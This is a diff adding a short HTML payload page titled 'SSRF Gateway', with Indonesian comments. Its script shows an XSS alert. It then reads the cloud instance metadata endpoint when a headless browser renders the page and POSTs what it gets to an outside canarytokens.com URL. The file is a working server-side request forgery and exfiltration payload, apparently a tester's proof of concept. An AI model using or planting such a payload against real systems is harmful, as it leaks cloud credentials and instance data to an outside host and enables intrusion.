@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>SSRF Gateway</title>
+    <script>
+      // Basic XSS Alert
+      alert("XSS berhasil");
+
+      // Auto SSRF Pingback (jika headless browser render script ini)
+      fetch("http://169.254.169.254/latest/meta-data/")
+        .then(res => res.text())
+        .then(data => {
+          fetch("http://canarytokens.com/images/k4wkdxbmcfy0f0i31vt3611a5/payments.js", {
+            method: "POST",
+            body: data
+          });
+        });
+    </script>
+  </head>
+  <body>
+    <h1>Payload Aktif</h1>
+  </body>
+</html>
